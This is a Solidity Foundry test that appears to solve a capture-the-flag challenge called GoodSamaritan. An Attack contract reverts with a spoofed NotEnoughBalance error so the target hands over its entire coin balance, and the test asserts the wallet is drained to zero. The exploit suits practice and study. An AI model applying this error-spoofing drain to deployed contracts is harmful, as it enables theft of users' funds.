// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../src/GoodSamaritan.sol";
import "@forge-std/Test.sol";

contract Attack is INotifyable {
    GoodSamaritan public goodSamaritan;
    error NotEnoughBalance();

    constructor(address gsAddress) {
        goodSamaritan = GoodSamaritan(gsAddress);
    }

    function request() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 a) external {
        if(a == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanTest is Test {
    GoodSamaritan public goodSamaritanContract;
    address public attacker;
    Coin public coinContract;
    Wallet public walletContract;

    function setUp() public {
        goodSamaritanContract = new GoodSamaritan();
        attacker = vm.addr(1);
        coinContract = goodSamaritanContract.coin();
        walletContract = goodSamaritanContract.wallet();
        assertEq(coinContract.balances(address(walletContract)), 10**6);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);
        Attack attack = new Attack(address(goodSamaritanContract));
        attack.request();
        vm.stopPrank();

        assertEq(coinContract.balances(address(walletContract)), 0);
    }
}